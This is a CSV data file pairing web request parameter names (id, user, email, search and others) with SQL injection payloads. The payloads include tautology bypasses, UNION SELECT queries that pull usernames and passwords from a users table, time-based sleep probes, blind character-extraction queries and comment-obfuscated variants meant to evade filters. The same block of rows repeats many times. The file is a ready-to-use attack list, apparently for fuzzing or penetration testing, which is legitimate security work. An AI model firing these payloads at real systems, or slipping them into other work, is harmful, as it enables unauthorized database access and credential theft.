Parameter,Payload
search,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
category,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
id,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
user,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
name,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
email,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
product,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
search,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
category,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
id,' OR '1'='1' --
user,' OR '1'='1' --
name,' OR '1'='1' --
email,' OR '1'='1' --
product,' OR '1'='1' --
search,' OR '1'='1' --
category,' OR '1'='1' --
id,""" OR ""1""=""1"" --"
user,""" OR ""1""=""1"" --"
name,""" OR ""1""=""1"" --"
email,""" OR ""1""=""1"" --"
product,""" OR ""1""=""1"" --"
search,""" OR ""1""=""1"" --"
category,""" OR ""1""=""1"" --"
id,' OR 1=1 --
user,' OR 1=1 --
name,' OR 1=1 --
email,' OR 1=1 --
product,' OR 1=1 --
search,' OR 1=1 --
category,' OR 1=1 --
id,"' UNION SELECT NULL, NULL --"
user,"' UNION SELECT NULL, NULL --"
name,"' UNION SELECT NULL, NULL --"
email,"' UNION SELECT NULL, NULL --"
product,"' UNION SELECT NULL, NULL --"
search,"' UNION SELECT NULL, NULL --"
category,"' UNION SELECT NULL, NULL --"
id,"' UNION SELECT username, password FROM users --"
user,"' UNION SELECT username, password FROM users --"
name,"' UNION SELECT username, password FROM users --"
email,"' UNION SELECT username, password FROM users --"
product,"' UNION SELECT username, password FROM users --"
search,"' UNION SELECT username, password FROM users --"
category,"' UNION SELECT username, password FROM users --"
id,' OR sleep(5) --
user,' OR sleep(5) --
name,' OR sleep(5) --
email,' OR sleep(5) --
product,' OR sleep(5) --
search,' OR sleep(5) --
category,' OR sleep(5) --
id,' AND (SELECT COUNT(*) FROM users) > 0 --
user,' AND (SELECT COUNT(*) FROM users) > 0 --
name,' AND (SELECT COUNT(*) FROM users) > 0 --
email,' AND (SELECT COUNT(*) FROM users) > 0 --
product,' AND (SELECT COUNT(*) FROM users) > 0 --
search,' AND (SELECT COUNT(*) FROM users) > 0 --
category,' AND (SELECT COUNT(*) FROM users) > 0 --
id,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
user,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
name,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
email,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
product,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
search,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
category,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
id,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
user,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
name,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
email,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
product,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
search,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
category,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
id,' OR '1'='1' --
user,' OR '1'='1' --
name,' OR '1'='1' --
email,' OR '1'='1' --
product,' OR '1'='1' --
search,' OR '1'='1' --
category,' OR '1'='1' --
id,""" OR ""1""=""1"" --"
user,""" OR ""1""=""1"" --"
name,""" OR ""1""=""1"" --"
email,""" OR ""1""=""1"" --"
product,""" OR ""1""=""1"" --"
search,""" OR ""1""=""1"" --"
category,""" OR ""1""=""1"" --"
id,' OR 1=1 --
user,' OR 1=1 --
name,' OR 1=1 --
email,' OR 1=1 --
product,' OR 1=1 --
search,' OR 1=1 --
category,' OR 1=1 --
id,"' UNION SELECT NULL, NULL --"
user,"' UNION SELECT NULL, NULL --"
name,"' UNION SELECT NULL, NULL --"
email,"' UNION SELECT NULL, NULL --"
product,"' UNION SELECT NULL, NULL --"
search,"' UNION SELECT NULL, NULL --"
category,"' UNION SELECT NULL, NULL --"
id,"' UNION SELECT username, password FROM users --"
user,"' UNION SELECT username, password FROM users --"
name,"' UNION SELECT username, password FROM users --"
email,"' UNION SELECT username, password FROM users --"
product,"' UNION SELECT username, password FROM users --"
search,"' UNION SELECT username, password FROM users --"
category,"' UNION SELECT username, password FROM users --"
id,' OR sleep(5) --
user,' OR sleep(5) --
name,' OR sleep(5) --
email,' OR sleep(5) --
product,' OR sleep(5) --
search,' OR sleep(5) --
category,' OR sleep(5) --
id,' AND (SELECT COUNT(*) FROM users) > 0 --
user,' AND (SELECT COUNT(*) FROM users) > 0 --
name,' AND (SELECT COUNT(*) FROM users) > 0 --
email,' AND (SELECT COUNT(*) FROM users) > 0 --
product,' AND (SELECT COUNT(*) FROM users) > 0 --
search,' AND (SELECT COUNT(*) FROM users) > 0 --
category,' AND (SELECT COUNT(*) FROM users) > 0 --
id,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
user,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
name,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
email,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
product,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
search,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
category,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
id,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
user,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
name,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
email,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
product,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
search,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
category,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
id,' OR '1'='1' --
user,' OR '1'='1' --
name,' OR '1'='1' --
email,' OR '1'='1' --
product,' OR '1'='1' --
search,' OR '1'='1' --
category,' OR '1'='1' --
id,""" OR ""1""=""1"" --"
user,""" OR ""1""=""1"" --"
name,""" OR ""1""=""1"" --"
email,""" OR ""1""=""1"" --"
product,""" OR ""1""=""1"" --"
search,""" OR ""1""=""1"" --"
category,""" OR ""1""=""1"" --"
id,' OR 1=1 --
user,' OR 1=1 --
name,' OR 1=1 --
email,' OR 1=1 --
product,' OR 1=1 --
search,' OR 1=1 --
category,' OR 1=1 --
id,"' UNION SELECT NULL, NULL --"
user,"' UNION SELECT NULL, NULL --"
name,"' UNION SELECT NULL, NULL --"
email,"' UNION SELECT NULL, NULL --"
product,"' UNION SELECT NULL, NULL --"
search,"' UNION SELECT NULL, NULL --"
category,"' UNION SELECT NULL, NULL --"
id,"' UNION SELECT username, password FROM users --"
user,"' UNION SELECT username, password FROM users --"
name,"' UNION SELECT username, password FROM users --"
email,"' UNION SELECT username, password FROM users --"
product,"' UNION SELECT username, password FROM users --"
search,"' UNION SELECT username, password FROM users --"
category,"' UNION SELECT username, password FROM users --"
id,' OR sleep(5) --
user,' OR sleep(5) --
name,' OR sleep(5) --
email,' OR sleep(5) --
product,' OR sleep(5) --
search,' OR sleep(5) --
category,' OR sleep(5) --
id,' AND (SELECT COUNT(*) FROM users) > 0 --
user,' AND (SELECT COUNT(*) FROM users) > 0 --
name,' AND (SELECT COUNT(*) FROM users) > 0 --
email,' AND (SELECT COUNT(*) FROM users) > 0 --
product,' AND (SELECT COUNT(*) FROM users) > 0 --
search,' AND (SELECT COUNT(*) FROM users) > 0 --
category,' AND (SELECT COUNT(*) FROM users) > 0 --
id,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
user,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
name,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
email,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
product,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
search,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
category,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
id,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
user,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
name,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
email,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
product,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
search,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
category,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
id,' OR '1'='1' --
user,' OR '1'='1' --
name,' OR '1'='1' --
email,' OR '1'='1' --
product,' OR '1'='1' --
search,' OR '1'='1' --
category,' OR '1'='1' --
id,""" OR ""1""=""1"" --"
user,""" OR ""1""=""1"" --"
name,""" OR ""1""=""1"" --"
email,""" OR ""1""=""1"" --"
product,""" OR ""1""=""1"" --"
search,""" OR ""1""=""1"" --"
category,""" OR ""1""=""1"" --"
id,' OR 1=1 --
user,' OR 1=1 --
name,' OR 1=1 --
email,' OR 1=1 --
product,' OR 1=1 --
search,' OR 1=1 --
category,' OR 1=1 --
id,"' UNION SELECT NULL, NULL --"
user,"' UNION SELECT NULL, NULL --"
name,"' UNION SELECT NULL, NULL --"
email,"' UNION SELECT NULL, NULL --"
product,"' UNION SELECT NULL, NULL --"
search,"' UNION SELECT NULL, NULL --"
category,"' UNION SELECT NULL, NULL --"
id,"' UNION SELECT username, password FROM users --"
user,"' UNION SELECT username, password FROM users --"
name,"' UNION SELECT username, password FROM users --"
email,"' UNION SELECT username, password FROM users --"
product,"' UNION SELECT username, password FROM users --"
search,"' UNION SELECT username, password FROM users --"
category,"' UNION SELECT username, password FROM users --"
id,' OR sleep(5) --
user,' OR sleep(5) --
name,' OR sleep(5) --
email,' OR sleep(5) --
product,' OR sleep(5) --
search,' OR sleep(5) --
category,' OR sleep(5) --
id,' AND (SELECT COUNT(*) FROM users) > 0 --
user,' AND (SELECT COUNT(*) FROM users) > 0 --
name,' AND (SELECT COUNT(*) FROM users) > 0 --
email,' AND (SELECT COUNT(*) FROM users) > 0 --
product,' AND (SELECT COUNT(*) FROM users) > 0 --
search,' AND (SELECT COUNT(*) FROM users) > 0 --
category,' AND (SELECT COUNT(*) FROM users) > 0 --
id,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
user,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
name,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
email,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
product,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
search,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
category,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
id,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
user,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
name,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
email,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
product,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
search,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
category,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
id,' OR '1'='1' --
user,' OR '1'='1' --
name,' OR '1'='1' --
email,' OR '1'='1' --
product,' OR '1'='1' --
search,' OR '1'='1' --
category,' OR '1'='1' --
id,""" OR ""1""=""1"" --"
user,""" OR ""1""=""1"" --"
name,""" OR ""1""=""1"" --"
email,""" OR ""1""=""1"" --"
product,""" OR ""1""=""1"" --"
search,""" OR ""1""=""1"" --"
category,""" OR ""1""=""1"" --"
id,' OR 1=1 --
user,' OR 1=1 --
name,' OR 1=1 --
email,' OR 1=1 --
product,' OR 1=1 --
search,' OR 1=1 --
category,' OR 1=1 --
id,"' UNION SELECT NULL, NULL --"
user,"' UNION SELECT NULL, NULL --"
name,"' UNION SELECT NULL, NULL --"
email,"' UNION SELECT NULL, NULL --"
product,"' UNION SELECT NULL, NULL --"
search,"' UNION SELECT NULL, NULL --"
category,"' UNION SELECT NULL, NULL --"
id,"' UNION SELECT username, password FROM users --"
user,"' UNION SELECT username, password FROM users --"
name,"' UNION SELECT username, password FROM users --"
email,"' UNION SELECT username, password FROM users --"
product,"' UNION SELECT username, password FROM users --"
search,"' UNION SELECT username, password FROM users --"
category,"' UNION SELECT username, password FROM users --"
id,' OR sleep(5) --
user,' OR sleep(5) --
name,' OR sleep(5) --
email,' OR sleep(5) --
product,' OR sleep(5) --
search,' OR sleep(5) --
category,' OR sleep(5) --
id,' AND (SELECT COUNT(*) FROM users) > 0 --
user,' AND (SELECT COUNT(*) FROM users) > 0 --
name,' AND (SELECT COUNT(*) FROM users) > 0 --
email,' AND (SELECT COUNT(*) FROM users) > 0 --
product,' AND (SELECT COUNT(*) FROM users) > 0 --
search,' AND (SELECT COUNT(*) FROM users) > 0 --
category,' AND (SELECT COUNT(*) FROM users) > 0 --
id,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
user,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
name,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
email,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
product,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
search,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
category,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
id,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
user,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
name,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
email,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
product,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
search,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
category,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
id,' OR '1'='1' --
user,' OR '1'='1' --
name,' OR '1'='1' --
email,' OR '1'='1' --
product,' OR '1'='1' --
search,' OR '1'='1' --
category,' OR '1'='1' --
id,""" OR ""1""=""1"" --"
user,""" OR ""1""=""1"" --"
name,""" OR ""1""=""1"" --"
email,""" OR ""1""=""1"" --"
product,""" OR ""1""=""1"" --"
search,""" OR ""1""=""1"" --"
category,""" OR ""1""=""1"" --"
id,' OR 1=1 --
user,' OR 1=1 --
name,' OR 1=1 --
email,' OR 1=1 --
product,' OR 1=1 --
search,' OR 1=1 --
category,' OR 1=1 --
id,"' UNION SELECT NULL, NULL --"
user,"' UNION SELECT NULL, NULL --"
name,"' UNION SELECT NULL, NULL --"
email,"' UNION SELECT NULL, NULL --"
product,"' UNION SELECT NULL, NULL --"
search,"' UNION SELECT NULL, NULL --"
category,"' UNION SELECT NULL, NULL --"
id,"' UNION SELECT username, password FROM users --"
user,"' UNION SELECT username, password FROM users --"
name,"' UNION SELECT username, password FROM users --"
email,"' UNION SELECT username, password FROM users --"
product,"' UNION SELECT username, password FROM users --"
search,"' UNION SELECT username, password FROM users --"
category,"' UNION SELECT username, password FROM users --"
id,' OR sleep(5) --
user,' OR sleep(5) --
name,' OR sleep(5) --
email,' OR sleep(5) --
product,' OR sleep(5) --
search,' OR sleep(5) --
category,' OR sleep(5) --
id,' AND (SELECT COUNT(*) FROM users) > 0 --
user,' AND (SELECT COUNT(*) FROM users) > 0 --
name,' AND (SELECT COUNT(*) FROM users) > 0 --
email,' AND (SELECT COUNT(*) FROM users) > 0 --
product,' AND (SELECT COUNT(*) FROM users) > 0 --
search,' AND (SELECT COUNT(*) FROM users) > 0 --
category,' AND (SELECT COUNT(*) FROM users) > 0 --
id,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
user,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
name,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
email,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
product,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
search,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
category,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
id,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
user,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
name,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
email,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
product,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
search,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
category,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
id,' OR '1'='1' --
user,' OR '1'='1' --
name,' OR '1'='1' --
email,' OR '1'='1' --
product,' OR '1'='1' --
search,' OR '1'='1' --
category,' OR '1'='1' --
id,""" OR ""1""=""1"" --"
user,""" OR ""1""=""1"" --"
name,""" OR ""1""=""1"" --"
email,""" OR ""1""=""1"" --"
product,""" OR ""1""=""1"" --"
search,""" OR ""1""=""1"" --"
category,""" OR ""1""=""1"" --"
id,' OR 1=1 --
user,' OR 1=1 --
name,' OR 1=1 --
email,' OR 1=1 --
product,' OR 1=1 --
search,' OR 1=1 --
category,' OR 1=1 --
id,"' UNION SELECT NULL, NULL --"
user,"' UNION SELECT NULL, NULL --"
name,"' UNION SELECT NULL, NULL --"
email,"' UNION SELECT NULL, NULL --"
product,"' UNION SELECT NULL, NULL --"
search,"' UNION SELECT NULL, NULL --"
category,"' UNION SELECT NULL, NULL --"
id,"' UNION SELECT username, password FROM users --"
user,"' UNION SELECT username, password FROM users --"
name,"' UNION SELECT username, password FROM users --"
email,"' UNION SELECT username, password FROM users --"
product,"' UNION SELECT username, password FROM users --"
search,"' UNION SELECT username, password FROM users --"
category,"' UNION SELECT username, password FROM users --"
id,' OR sleep(5) --
user,' OR sleep(5) --
name,' OR sleep(5) --
email,' OR sleep(5) --
product,' OR sleep(5) --
search,' OR sleep(5) --
category,' OR sleep(5) --
id,' AND (SELECT COUNT(*) FROM users) > 0 --
user,' AND (SELECT COUNT(*) FROM users) > 0 --
name,' AND (SELECT COUNT(*) FROM users) > 0 --
email,' AND (SELECT COUNT(*) FROM users) > 0 --
product,' AND (SELECT COUNT(*) FROM users) > 0 --
search,' AND (SELECT COUNT(*) FROM users) > 0 --
category,' AND (SELECT COUNT(*) FROM users) > 0 --
id,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
user,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
name,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
email,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
product,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
search,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
category,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
id,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
user,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
name,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
email,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
product,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
search,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
category,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
id,' OR '1'='1' --
user,' OR '1'='1' --
name,' OR '1'='1' --
email,' OR '1'='1' --
product,' OR '1'='1' --
search,' OR '1'='1' --
category,' OR '1'='1' --
id,""" OR ""1""=""1"" --"
user,""" OR ""1""=""1"" --"
name,""" OR ""1""=""1"" --"
email,""" OR ""1""=""1"" --"
product,""" OR ""1""=""1"" --"
search,""" OR ""1""=""1"" --"
category,""" OR ""1""=""1"" --"
id,' OR 1=1 --
user,' OR 1=1 --
name,' OR 1=1 --
email,' OR 1=1 --
product,' OR 1=1 --
search,' OR 1=1 --
category,' OR 1=1 --
id,"' UNION SELECT NULL, NULL --"
user,"' UNION SELECT NULL, NULL --"
name,"' UNION SELECT NULL, NULL --"
email,"' UNION SELECT NULL, NULL --"
product,"' UNION SELECT NULL, NULL --"
search,"' UNION SELECT NULL, NULL --"
category,"' UNION SELECT NULL, NULL --"
id,"' UNION SELECT username, password FROM users --"
user,"' UNION SELECT username, password FROM users --"
name,"' UNION SELECT username, password FROM users --"
email,"' UNION SELECT username, password FROM users --"
product,"' UNION SELECT username, password FROM users --"
search,"' UNION SELECT username, password FROM users --"
category,"' UNION SELECT username, password FROM users --"
id,' OR sleep(5) --
user,' OR sleep(5) --
name,' OR sleep(5) --
email,' OR sleep(5) --
product,' OR sleep(5) --
search,' OR sleep(5) --
category,' OR sleep(5) --
id,' AND (SELECT COUNT(*) FROM users) > 0 --
user,' AND (SELECT COUNT(*) FROM users) > 0 --
name,' AND (SELECT COUNT(*) FROM users) > 0 --
email,' AND (SELECT COUNT(*) FROM users) > 0 --
product,' AND (SELECT COUNT(*) FROM users) > 0 --
search,' AND (SELECT COUNT(*) FROM users) > 0 --
category,' AND (SELECT COUNT(*) FROM users) > 0 --
id,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
user,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
name,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
email,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
product,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
search,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
category,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
id,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
user,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
name,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
email,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
product,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
search,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
category,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
id,' OR '1'='1' --
user,' OR '1'='1' --
name,' OR '1'='1' --
email,' OR '1'='1' --
product,' OR '1'='1' --
search,' OR '1'='1' --
category,' OR '1'='1' --
id,""" OR ""1""=""1"" --"
user,""" OR ""1""=""1"" --"
name,""" OR ""1""=""1"" --"
email,""" OR ""1""=""1"" --"
product,""" OR ""1""=""1"" --"
search,""" OR ""1""=""1"" --"
category,""" OR ""1""=""1"" --"
id,' OR 1=1 --
user,' OR 1=1 --
name,' OR 1=1 --
email,' OR 1=1 --
product,' OR 1=1 --
search,' OR 1=1 --
category,' OR 1=1 --
id,"' UNION SELECT NULL, NULL --"
user,"' UNION SELECT NULL, NULL --"
name,"' UNION SELECT NULL, NULL --"
email,"' UNION SELECT NULL, NULL --"
product,"' UNION SELECT NULL, NULL --"
search,"' UNION SELECT NULL, NULL --"
category,"' UNION SELECT NULL, NULL --"
id,"' UNION SELECT username, password FROM users --"
user,"' UNION SELECT username, password FROM users --"
name,"' UNION SELECT username, password FROM users --"
email,"' UNION SELECT username, password FROM users --"
product,"' UNION SELECT username, password FROM users --"
search,"' UNION SELECT username, password FROM users --"
category,"' UNION SELECT username, password FROM users --"
id,' OR sleep(5) --
user,' OR sleep(5) --
name,' OR sleep(5) --
email,' OR sleep(5) --
product,' OR sleep(5) --
search,' OR sleep(5) --
category,' OR sleep(5) --
id,' AND (SELECT COUNT(*) FROM users) > 0 --
user,' AND (SELECT COUNT(*) FROM users) > 0 --
name,' AND (SELECT COUNT(*) FROM users) > 0 --
email,' AND (SELECT COUNT(*) FROM users) > 0 --
product,' AND (SELECT COUNT(*) FROM users) > 0 --
search,' AND (SELECT COUNT(*) FROM users) > 0 --
category,' AND (SELECT COUNT(*) FROM users) > 0 --
id,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
user,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
name,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
email,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
product,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
search,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
category,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
id,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
user,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
name,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
email,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
product,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
search,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
category,"' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users --"
id,' OR '1'='1' --
user,' OR '1'='1' --
name,' OR '1'='1' --
email,' OR '1'='1' --
product,' OR '1'='1' --
search,' OR '1'='1' --
category,' OR '1'='1' --
id,""" OR ""1""=""1"" --"
user,""" OR ""1""=""1"" --"
name,""" OR ""1""=""1"" --"
email,""" OR ""1""=""1"" --"
product,""" OR ""1""=""1"" --"
search,""" OR ""1""=""1"" --"
category,""" OR ""1""=""1"" --"
id,' OR 1=1 --
user,' OR 1=1 --
name,' OR 1=1 --
email,' OR 1=1 --
product,' OR 1=1 --
search,' OR 1=1 --
category,' OR 1=1 --
id,"' UNION SELECT NULL, NULL --"
user,"' UNION SELECT NULL, NULL --"
name,"' UNION SELECT NULL, NULL --"
email,"' UNION SELECT NULL, NULL --"
product,"' UNION SELECT NULL, NULL --"
search,"' UNION SELECT NULL, NULL --"
category,"' UNION SELECT NULL, NULL --"
id,"' UNION SELECT username, password FROM users --"
user,"' UNION SELECT username, password FROM users --"
name,"' UNION SELECT username, password FROM users --"
email,"' UNION SELECT username, password FROM users --"
product,"' UNION SELECT username, password FROM users --"
search,"' UNION SELECT username, password FROM users --"
category,"' UNION SELECT username, password FROM users --"
id,' OR sleep(5) --
user,' OR sleep(5) --
name,' OR sleep(5) --
email,' OR sleep(5) --
product,' OR sleep(5) --
search,' OR sleep(5) --
category,' OR sleep(5) --
id,' AND (SELECT COUNT(*) FROM users) > 0 --
user,' AND (SELECT COUNT(*) FROM users) > 0 --
name,' AND (SELECT COUNT(*) FROM users) > 0 --
email,' AND (SELECT COUNT(*) FROM users) > 0 --
product,' AND (SELECT COUNT(*) FROM users) > 0 --
search,' AND (SELECT COUNT(*) FROM users) > 0 --
category,' AND (SELECT COUNT(*) FROM users) > 0 --
id,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
user,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
name,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
email,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
product,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
search,"' OR ASCII(SUBSTRING((SELECT database()),1,1))=100 --"
